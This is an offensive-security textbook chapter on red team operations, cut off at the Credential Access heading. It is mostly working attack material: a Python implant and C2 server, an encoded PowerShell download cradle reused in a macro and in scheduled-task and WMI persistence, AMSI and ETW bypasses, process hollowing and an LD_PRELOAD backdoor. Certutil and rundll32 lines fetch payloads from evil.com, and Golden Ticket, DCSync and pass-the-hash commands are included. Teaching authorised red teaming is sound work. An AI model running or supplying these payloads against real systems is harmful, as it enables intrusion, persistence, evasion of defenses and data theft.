# Chapter 4: Red Team Operations and Advanced Adversary Simulation

## Table of Contents
1. [Introduction to Red Teaming](#introduction)
2. [Red Team Methodology and Planning](#methodology)
3. [Command and Control Frameworks](#c2-frameworks)
4. [Initial Access Techniques](#initial-access)
5. [Persistence Mechanisms](#persistence)
6. [Privilege Escalation](#privilege-escalation)
7. [Lateral Movement](#lateral-movement)
8. [Defense Evasion](#defense-evasion)
9. [Credential Access](#credential-access)
10. [Data Exfiltration](#data-exfiltration)
11. [Purple Team Exercises](#purple-team)

---

## Introduction to Red Teaming

Red Team operations represent the pinnacle of offensive security engagements, simulating sophisticated adversaries to test organizational defenses. Unlike traditional penetration testing that focuses on technical vulnerabilities, Red Teaming evaluates the complete security ecosystem including people, processes, and technology.

### Red Team vs Penetration Testing

**Penetration Testing**:
- Time-boxed engagement (typically days or weeks)
- Focus on identifying technical vulnerabilities
- Often scoped to specific systems or networks
- Goal: Find as many vulnerabilities as possible
- Usually announced to security teams

**Red Team Operations**:
- Extended duration (weeks to months)
- Focus on achieving specific objectives (flags)
- Tests entire security program including detection and response
- Goal: Achieve objectives without detection
- Typically conducted as covert operations

### Red Team Objectives

Common Red Team objectives include:

**Technical Objectives**:
- Compromise specific critical assets (domain controllers, databases)
- Access sensitive data (PII, financial records, intellectual property)
- Establish persistent access
- Demonstrate business impact

**Operational Objectives**:
- Test detection and response capabilities
- Evaluate security monitoring effectiveness
- Assess incident response procedures
- Identify security control gaps

### Red Team Engagement Types

**Full Engagement**: Complete simulation from initial access through data exfiltration with no restrictions.

**Assumed Breach**: Begins with the assumption that an endpoint is already compromised, focusing on lateral movement and persistence.

**Tabletop Exercises**: Discussion-based scenarios that test decision-making and procedures without actual technical execution.

**Purple Team**: Collaborative exercises where red and blue teams work together to improve defenses in real-time.

---

## Red Team Methodology and Planning

Effective Red Team operations require meticulous planning and adherence to established frameworks.

### Planning Phase

**Scoping and Rules of Engagement**:
```
ROE Template:
1. Scope Definition
   - Target organizations and subsidiaries
   - IP ranges and domains
   - Excluded systems (safety-critical, out-of-scope)
   
2. Engagement Parameters
   - Start and end dates
   - Attack windows (business hours vs 24/7)
   - Communication protocols
   - Emergency contacts
   
3. Constraints and Limitations
   - Prohibited techniques (DoS, data destruction)
   - Data handling requirements
   - Destructive action restrictions
   
4. Legal Considerations
   - Authorization documentation
   - Jurisdictional issues
   - Data privacy compliance
```

**Intelligence Gathering**:
```bash
# External reconnaissance
# Domain enumeration
whois target.com
dig target.com ANY
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o amass_results.txt

# Cloud asset discovery
cloud_enum -k target -t 10
crowbar -b -s 192.168.0.0/24 -t 50 -n 5

# Employee enumeration
theHarvester -d target.com -b all -f harvester_results.html
linkedin2username -c target -o users.txt

# Technology fingerprinting
wafw00f target.com
whatweb target.com
httpx -l subdomains.txt -tech-detect -status-code
```

### Operational Security (OPSEC)

**Infrastructure Setup**:
```bash
# Domain registration
# Use privacy protection registrars
# Register multiple domains for rotation
# Age domains before use (minimum 30 days)

# Infrastructure procurement
# Use bulletproof hosting when necessary
# Implement redirectors for all traffic
# Separate infrastructure per operation

# Example redirector setup
# Redirector redirects to C2 server
# If detected, only redirector is burned
```

**Redirector Configuration**:
```bash
# Apache redirector setup
# /etc/apache2/sites-available/redirect.conf
<VirtualHost *:80>
    ServerName cdn-updates.com
    
    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/api/v1/update [NC]
    RewriteCond %{HTTP_USER_AGENT} ^Mozilla.* [NC]
    RewriteRule ^.*$ http://c2-server.internal%{REQUEST_URI} [P,L]
    
    # Return 404 for everything else
    RewriteRule ^.*$ - [R=404,L]
</VirtualHost>

# Enable required modules
a2enmod rewrite proxy proxy_http
systemctl restart apache2
```

**Traffic Segmentation**:
```bash
# Using CDN as redirector (CloudFlare example)
# Point domain to CloudFlare
# Configure Page Rules to filter traffic
# Origin server only accepts CloudFlare IPs

# iptables to restrict to CloudFlare
for ip in $(curl https://www.cloudflare.com/ips-v4); do
    iptables -A INPUT -p tcp -s $ip --dport 443 -j ACCEPT
done
iptables -A INPUT -p tcp --dport 443 -j DROP
```

### Threat Intelligence Integration

**Adversary Emulation**:
```bash
# MITRE ATT&CK Framework mapping
# Select APT group to emulate
# Research TTPs (Tactics, Techniques, and Procedures)

# Example: Emulating APT29
# Initial Access: Spearphishing with malicious attachments
# Execution: PowerShell, Cobalt Strike
# Persistence: Registry run keys, scheduled tasks
# Credential Access: LSASS memory, Kerberoasting
```

**Custom Tool Development**:
```python
# Custom implant example
import socket
import subprocess
import base64
import ssl

class Implant:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE
        
    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.ssl_sock = self.context.wrap_socket(self.sock)
                self.ssl_sock.connect((self.c2_host, self.c2_port))
                self.handle()
            except Exception as e:
                time.sleep(60)
                
    def handle(self):
        while True:
            cmd = self.ssl_sock.recv(4096).decode()
            if cmd.startswith("exec"):
                result = subprocess.getoutput(cmd[5:])
                self.ssl_sock.send(base64.b64encode(result.encode()))
            elif cmd.startswith("download"):
                with open(cmd[9:], 'rb') as f:
                    self.ssl_sock.send(base64.b64encode(f.read()))
```

---

## Command and Control Frameworks

Command and Control (C2) frameworks provide the infrastructure for managing compromised systems during Red Team operations.

### Cobalt Strike

**Teamserver Setup**:
```bash
# Start team server
./teamserver <external_ip> <password> <malleable_c2_profile>

# With profile
./teamserver 192.168.1.100 Sup3rS3cr3t! cdn.profile

# Client connection
./cobaltstrike
# Enter teamserver IP, password, and operator name
```

**Malleable C2 Profile**:
```
# Example profile snippet
set sample_name "CDN Update Profile";

http-get {
    set uri "/updates/check";
    
    client {
        header "Accept" "application/json";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        
        metadata {
            base64;
            prepend "session=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/json";
        
        output {
            base64;
            prepend "{\"data\":\"";
            append "\"}";
            print;
        }
    }
}

http-post {
    set uri "/updates/submit";
    
    client {
        header "Content-Type" "application/json";
        
        id {
            base64;
            prepend "{\"id\":\"";
            append "\",";
        }
        
        output {
            base64;
            prepend "\"data\":\"";
            append "\"}";
            print;
        }
    }
}
```

**Beacon Configuration**:
```bash
# Create listener
# Cobalt Strike > Listeners > Add
# Name: https-cdn
# Payload: Beacon HTTPS
# Hosts: cdn-updates.com
# Port: 443

# Generate payload
# Attacks > Packages > Windows Executable
# Select listener
# Output: Windows EXE, DLL, PowerShell, etc.

# Post-exploitation
beacon> getuid
beacon> ls
beacon> shell whoami
beacon> powershell-import PowerView.ps1
beacon> powershell Get-Domain
```

### Sliver C2

**Server Setup**:
```bash
# Install Sliver
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux

# Generate operator config
./sliver-server_linux operator --name operator --lhost 192.168.1.100 --save /root/operator.cfg

# Start server with multi-player mode
./sliver-server_linux daemon

# Client connection
sliver-client import /root/operator.cfg
sliver-client connect
```

**Implant Generation**:
```bash
# Generate implant
sliver > generate --mtls 192.168.1.100 --save /tmp/implant.exe --format exe

# With specific evasion
sliver > generate --mtls 192.168.1.100 --save /tmp/implant.exe --format exe \
    --seconds 20 --limit-obfuscated

# Generate shellcode
sliver > generate --mtls 192.168.1.100 --save /tmp/shellcode.bin --format shellcode

# Staged payload
sliver > generate stager --lhost 192.168.1.100 --lport 8443 --save /tmp/stager.exe
```

**Session Management**:
```bash
# List sessions
sliver > sessions

# Interact with session
sliver > use SESSION_ID

# Basic commands
sliver (SESSION) > info
sliver (SESSION) > whoami
sliver (SESSION) > ps
sliver (SESSION) > netstat

# Privilege escalation
sliver (SESSION) > getsystem
sliver (SESSION) > elevate

# Lateral movement
sliver (SESSION) > pivots tcp --bind 0.0.0.0:8080
sliver (SESSION) > execute -o wmiexec target admin password cmd.exe
```

### Mythic C2

**Installation**:
```bash
# Clone and setup
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Install dependencies
./install_docker_kali.sh

# Start Mythic
./mythic-cli start

# Add user
./mythic-cli add_user admin password

# Access at https://localhost:7443
```

**Agent Development**:
```python
# Example Apollo agent payload
# Mythic uses JSON-based communication

{
    "action": "get_tasking",
    "tasking_size": 10,
    "delegates": []
}

# Response format
{
    "action": "post_response",
    "responses": [
        {
            "task_id": "uuid",
            "user_output": "command output",
            "completed": true
        }
    ]
}
```

### Custom C2 Development

**Python-based C2 Server**:
```python
#!/usr/bin/env python3
import asyncio
import ssl
import json
import base64
from datetime import datetime

class C2Server:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.agents = {}
        self.tasks = {}
        
        self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.ssl_context.load_cert_chain('server.crt', 'server.key')
        
    async def handle_client(self, reader, writer):
        addr = writer.get_extra_info('peername')
        agent_id = None
        
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break
                    
                message = json.loads(data.decode())
                agent_id = message.get('agent_id')
                
                if agent_id not in self.agents:
                    self.agents[agent_id] = {
                        'addr': addr,
                        'first_seen': datetime.now(),
                        'last_seen': datetime.now()
                    }
                    print(f"[+] New agent: {agent_id} from {addr}")
                
                self.agents[agent_id]['last_seen'] = datetime.now()
                
                # Handle check-in
                if message.get('type') == 'checkin':
                    tasks = self.get_pending_tasks(agent_id)
                    response = json.dumps({'tasks': tasks})
                    writer.write(response.encode())
                    await writer.drain()
                    
                # Handle results
                elif message.get('type') == 'result':
                    print(f"[+] Result from {agent_id}:")
                    print(base64.b64decode(message['data']).decode())
                    
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            writer.close()
            
    def get_pending_tasks(self, agent_id):
        tasks = self.tasks.get(agent_id, [])
        self.tasks[agent_id] = []
        return tasks
        
    def add_task(self, agent_id, command):
        if agent_id not in self.tasks:
            self.tasks[agent_id] = []
        self.tasks[agent_id].append({
            'id': len(self.tasks[agent_id]),
            'command': command
        })
        
    async def start(self):
        server = await asyncio.start_server(
            self.handle_client, self.host, self.port, ssl=self.ssl_context
        )
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        
        async with server:
            await server.serve_forever()

if __name__ == '__main__':
    c2 = C2Server()
    asyncio.run(c2.start())
```

---

## Initial Access Techniques

Initial access represents the first foothold in a target environment. Red teams employ various techniques to achieve initial compromise.

### Spear Phishing

**Email Reconnaissance**:
```bash
# Verify email format and existence
theHarvester -d target.com -b linkedin
cat emails.txt | while read email; do
    smtp-user-enum -M VRFY -U $email -t mail.target.com
done

# Email pattern discovery
# hunter.io API
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=API_KEY"
```

**Phishing Infrastructure**:
```bash
# GoPhish setup
docker run -it --rm -p 3333:3333 -p 8080:80 gophish/gophish

# Evilginx2 for credential harvesting
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && go build
./evilginx2

# Configure phishlet
: phishlets hostname o365 login.target.com
: phishlets enable o365
: lures create o365
: lures get-url 0
```

**Payload Delivery**:
```powershell
# Office macro payload
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAeQAuAHAAcwAxACcAKQA="
    Shell cmd, vbHide
End Sub

# ISO/ZIP container to bypass MOTW
# Create ISO with payload
oscdimg -n -d -m payload.exe out.iso

# Create ZIP with double extension
mv payload.exe document.pdf.exe
zip -r document.zip document.pdf.exe
```

### External Service Exploitation

**VPN and Remote Access**:
```bash
# VPN enumeration
nmap -sU -p 500,4500 --script ike-version target.com
ike-scan -M target.com

# Citrix enumeration
nmap -p 443 --script http-citrix-enum-apps target.com

# Pulse Secure / Fortinet detection
curl -k https://target.com/dana-na/auth/url_default/welcome.cgi
curl -k https://target.com/remote/login

# Exploit known vulnerabilities
# CVE-2019-19781 Citrix ADC
python3 cve-2019-19781.py target.com
```

**Web Application Exploitation**:
```bash
# Initial foothold through web apps
# SQL Injection to command execution
sqlmap -u "https://target.com/app.php?id=1" --os-shell

# File upload bypass
# Bypass extension filters
curl -X POST -F "file=@shell.php.jpg" https://target.com/upload

# Deserialization exploitation
ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 \
    -c "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAeQAuAHAAcwAxACcAKQA="
```

### Supply Chain Attacks

**Software Update Hijacking**:
```bash
# Identify update mechanisms
# DNS hijacking or response manipulation

# Fake update server
python3 -m http.server 80
# Host malicious update files

# DLL hijacking in legitimate software
# Place malicious DLL in application directory
```

**Trusted Relationship Exploitation**:
```bash
# Compromise vendor or MSP
# Pivot to target through trusted connections

# VPN access through compromised MSP
# Use MSP credentials to access multiple clients
```

---

## Persistence Mechanisms

Maintaining access over time is critical for Red Team operations, allowing continued access even if initial entry points are discovered and remediated.

### Windows Persistence

**Registry Persistence**:
```powershell
# Run key persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "SecurityUpdate" -Value "C:\Windows\Temp\svchost.exe"

# RunOnce key
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
Set-ItemProperty -Path $regPath -Name "SystemUpdate" -Value "C:\Windows\System32\update.exe"

# Winlogon shell modification
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
    -Name "Shell" -Value "explorer.exe, C:\Windows\Temp\backdoor.exe"

# Image file execution options (debugger)
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" \
    -Name "Debugger" -Value "C:\Windows\System32\cmd.exe"
```

**Scheduled Tasks**:
```powershell
# Create scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAeQAuAHAAcwAxACcAKQA="
$trigger = New-ScheduledTaskTrigger -Daily -At "12:00"
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Settings $settings

# WMI event subscription (fileless)
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "WindowsUpdateFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAeQAuAHAAcwAxACcAKQA="
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**Service Persistence**:
```powershell
# Create malicious service
New-Service -Name "WinDefendService" -BinaryPathName "C:\Windows\Temp\svc.exe" -DisplayName "Windows Defender Service" -StartupType Automatic
Start-Service -Name "WinDefendService"

# Modify existing service
sc config LanmanServer binPath= "C:\Windows\Temp\backdoor.exe"
```

**DLL Hijacking Persistence**:
```powershell
# Identify vulnerable applications
# Place malicious DLL in application directory
# DLL sideloading through legitimate signed binaries

# COM hijacking
New-Item -Path "HKCU:\Software\Classes\CLSID\{GUID}" -Force
New-Item -Path "HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{GUID}\InprocServer32" -Name "(Default)" -Value "C:\Windows\Temp\malicious.dll"
```

### Linux Persistence

**Cron Jobs**:
```bash
# User crontab
crontab -l
echo "* * * * * /tmp/update.sh" | crontab -

# System-wide cron
# Add to /etc/crontab, /etc/cron.d/, /etc/cron.daily/, etc.
echo "* * * * * root /tmp/update.sh" >> /etc/crontab

# Hidden cron in system locations
# /var/spool/cron/crontabs/
# /etc/cron.hourly/
```

**Systemd Services**:
```bash
# Create systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/update
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service
```

**SSH Keys**:
```bash
# Add authorized key
echo "ssh-rsa AAAA... attacker@evil.com" >> ~/.ssh/authorized_keys

# Modify SSH config
cat >> ~/.ssh/config << 'EOF'
Host *
    PermitLocalCommand yes
    LocalCommand /tmp/update.sh
EOF

# Backdoor SSH binary
# Replace /usr/bin/ssh with wrapper that logs credentials
```

**LD_PRELOAD**:
```c
// backdoor.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

// Compile: gcc -shared -fPIC -o backdoor.so backdoor.c

__attribute__((constructor)) void init() {
    // Execute payload on library load
    system("/tmp/payload.sh");
}
```

```bash
# Set LD_PRELOAD globally
echo "/tmp/backdoor.so" >> /etc/ld.so.preload
```

### Active Directory Persistence

**Golden Ticket**:
```bash
# Using Mimikatz
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
# Note the NTLM hash

# Create golden ticket
mimikatz # kerberos::golden /user:administrator /domain:target.com /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi
mimikatz # kerberos::ptt golden.kirbi

# Access resources
klist
ls \\dc01.target.com\c$
```

**Silver Ticket**:
```bash
# Create silver ticket for specific service
mimikatz # kerberos::golden /user:administrator /domain:target.com /sid:S-1-5-21-... /target:server.target.com /service:cifs /rc4:HASH /ticket:silver.kirbi
mimikatz # kerberos::ptt silver.kirbi
```

**DCSync Rights**:
```bash
# Grant DCSync rights to compromised user
# Using PowerView
Add-DomainObjectAcl -TargetIdentity "DC=target,DC=com" -PrincipalIdentity compromiseduser -Rights DCSync

# Perform DCSync
mimikatz # lsadump::dcsync /domain:target.com /user:administrator
```

**AdminSDHolder Abuse**:
```bash
# Add backdoor to AdminSDHolder
# Changes propagate to protected groups every 60 minutes
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=target,DC=com" -PrincipalIdentity backdooruser -Rights GenericAll
```

---

## Privilege Escalation

Escalating privileges is essential for achieving operational objectives and maintaining persistent access.

### Windows Privilege Escalation

**Enumeration**:
```powershell
# System information
systeminfo
Get-ComputerInfo

# Patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn

# User and group information
whoami /all
Get-LocalUser
Get-LocalGroupMember administrators

# Running processes
Get-Process | Select-Object Name, Id, Path
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Services
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject win32_service | Select-Object Name, State, PathName

# Scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -eq "\"} | Get-ScheduledTaskInfo

# Network connections
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# Interesting files
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

**Privilege Escalation Tools**:
```powershell
# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# WinPEAS
winPEAS.exe

# Sherlock
Import-Module .\Sherlock.ps1
Find-AllVulns

# Watson
Watson.exe
```

**Common Techniques**:
```powershell
# Unquoted service path
# If service path contains spaces and is not quoted
sc qc "Vulnerable Service"
# Path: C:\Program Files\Vulnerable App\service.exe
# Place payload at C:\Program.exe

# Weak service permissions
# Using accesschk
accesschk.exe -uwcqv "Authenticated Users" *

# AlwaysInstallElevated
Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated
Get-ItemProperty HKCU:\Software\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated
# If both are 1, can install MSI as SYSTEM

# Kernel exploits
# Check for known vulnerable drivers
# Bring Your Own Vulnerable Driver (BYOVD) attacks
```

### Linux Privilege Escalation

**Enumeration**:
```bash
# System information
uname -a
cat /etc/os-release
cat /proc/version

# Kernel exploits
searchsploit linux kernel $(uname -r)

# Sudo privileges
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.*

# Running processes
ps aux
ps -ef

# Network connections
netstat -tulpn
ss -tulpn

# Writable locations
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# Interesting files
find / -name "*.txt" -o -name "*.config" -o -name "*.xml" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

**Automated Enumeration**:
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./linenum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# Unix Privesc Check
./upc.sh
```

**Common Exploits**:
```bash
# Sudo abuse
sudo -l
# If (ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash

# LD_PRELOAD with sudo
sudo LD_PRELOAD=/tmp/backdoor.so /bin/ls

# Wildcard abuse in cron
# If cron runs: /usr/bin/tar czf backup.tar *
# Create files: --checkpoint=1 and --checkpoint-action=exec=sh shell.sh

# Writable /etc/passwd
echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
su root

# Docker group membership
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Lateral Movement

Moving through the network to reach high-value targets while avoiding detection is a core Red Team skill.

### Windows Lateral Movement

**PsExec**:
```bash
# Using PsExec
psexec.exe \\target.domain.com -u domain\administrator -p Password123 cmd.exe

# Using pass-the-hash
psexec.exe -hashes :NTLM_HASH domain\administrator@target.domain.com
```

**WMI and WinRM**:
```powershell
# WMI execution
wmic /node:target.domain.com /user:domain\administrator /password:Password123 process call create "cmd.exe /c whoami"

# PowerShell remoting
Enter-PSSession -ComputerName target.domain.com -Credential domain\administrator
Invoke-Command -ComputerName target.domain.com -ScriptBlock { whoami } -Credential domain\administrator

# Using evil-winrm
evil-winrm -i target.domain.com -u administrator -p Password123
evil-winrm -i target.domain.com -u administrator -H NTLM_HASH
```

**Pass-the-Hash**:
```bash
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:administrator /domain:target.com /ntlm:HASH /run:cmd.exe

# Impacket psexec
psexec.py -hashes :NTLM_HASH domain/administrator@target.domain.com

# Impacket wmiexec
wmiexec.py -hashes :NTLM_HASH domain/administrator@target.domain.com

# Impacket smbexec
smbexec.py -hashes :NTLM_HASH domain/administrator@target.domain.com
```

**Pass-the-Ticket**:
```bash
# Export tickets
mimikatz # sekurlsa::tickets /export

# Inject ticket
mimikatz # kerberos::ptt [0;123456]-0-0-40810000-administrator@krbtgt-TARGET.COM.kirbi

# Use with psexec
psexec.exe \\target.domain.com cmd.exe
```

**DCOM Lateral Movement**:
```powershell
# Execute via DCOM
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","target.domain.com"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAeQAuAHAAcwAxACcAKQA=","7")
```

### Linux Lateral Movement

**SSH-based Movement**:
```bash
# Using compromised SSH keys
ssh -i id_rsa user@target

# SSH agent hijacking
ssh -A user@pivot
# On pivot: cat /proc/*/environ | grep SSH_AUTH_SOCK
# Use agent to connect to other hosts

# SSH key theft
# Extract keys from ~/.ssh/ on compromised hosts
```

**RDP from Linux**:
```bash
# Using xfreerdp
xfreerdp /u:administrator /p:Password123 /v:target.domain.com
xfreerdp /u:administrator /pth:NTLM_HASH /v:target.domain.com

# Using rdesktop
rdesktop -u administrator -p Password123 target.domain.com
```

**Network Pivoting**:
```bash
# SSH tunnel
ssh -D 1080 user@pivot-host
ssh -L 3389:internal-host:3389 user@pivot-host
ssh -R 4444:localhost:4444 user@pivot-host

# Proxychains
proxychains nmap -sT -p 445 internal-host
proxychains smbclient -L //internal-host

# Metasploit pivot
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > portfwd add -l 445 -p 445 -r internal-host
```

---

## Defense Evasion

Evading detection mechanisms is critical for maintaining operational security and achieving objectives.

### Anti-Virus Evasion

**Payload Encoding and Encryption**:
```python
# Custom payload encoder
import base64
import random

def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

payload = "powershell -enc SGVsbG8gV29ybGQ="
key = random.randint(1, 255)
encrypted = xor_encrypt(payload, key)
encoded = base64.b64encode(encrypted.encode())

# Decoder stub
decoder = f"""
$key = {key}
$encoded = '{encoded.decode()}'
$encrypted = [System.Convert]::FromBase64String($encoded)
$payload = -join ($encrypted | ForEach-Object {{ [char]($_ -bxor $key) }})
iex $payload
"""
```

**Process Injection**:
```c
// Process hollowing technique
#include <windows.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Create suspended process
    CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, 
                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Unmap original code
    HMODULE hNtdll = GetModuleHandle("ntdll");
    FARPROC pNtUnmap = GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    ((NTSTATUS(*)(HANDLE, PVOID))pNtUnmap)(pi.hProcess, (PVOID)0x10000000);
    
    // Allocate and write malicious code
    // Resume thread
    
    return 0;
}
```

**AMSI Bypass**:
```powershell
# AMSI bypass techniques
# Method 1: Memory patch
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
$c = $b.GetValue($null)
[IntPtr]$ptr = $c
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Method 2: Forcing error
$a = 'Get`Pro' + 'cess'  # Bypass string detection
```

**ETW Bypass**:
```c
// Disable ETW through patching
#include <windows.h>

void DisableETW() {
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    // Patch to return immediately
    BYTE patch[] = { 0xC3 };  // ret
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pEtwEventWrite, patch, 1);
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}
```

### Living Off The Land

**PowerShell Without PowerShell**:
```bash
# Execute PowerShell without powershell.exe
# Using msbuild
msbuild.exe powershell.xml

# Using installutil
installutil.exe /logfile= /LogToConsole=false /U payload.dll

# Using mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc ..."", 0 : close")

# Using rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://evil.com/payload.sct");o.exec();
```

**Signed Binary Proxy Execution**:
```bash
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin
bitsadmin /transfer job http://evil.com/payload.exe C:\Windows\Temp\payload.exe

# certoc
certoc.exe -LoadDLL payload.dll

# Esentutl
esentutl.exe /y "\\evil.com\share\payload.exe" /d "C:\Windows\Temp\payload.exe" /o
```

### Obfuscation

**PowerShell Obfuscation**:
```powershell
# Invoke-Obfuscation
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation -ScriptPath .\payload.ps1 -Command 'Token\All,1,Encoding\Ascii,Launcher\PS\0'

# Chimera
python3 chimera.py -f payload.ps1 -o obfuscated.ps1 -c -p -v -t -l 3
```

**Domain Fronting**:
```bash
# Use CDN to hide C2 traffic
# Host header points to C2 domain
# TLS SNI points to legitimate domain

# Example with curl
curl -H "Host: evil.com" https://legitimate.azureedge.net/tasks \
    --resolve legitimate.azureedge.net:443:104.214.XX.XX
```

---

## Credential Access

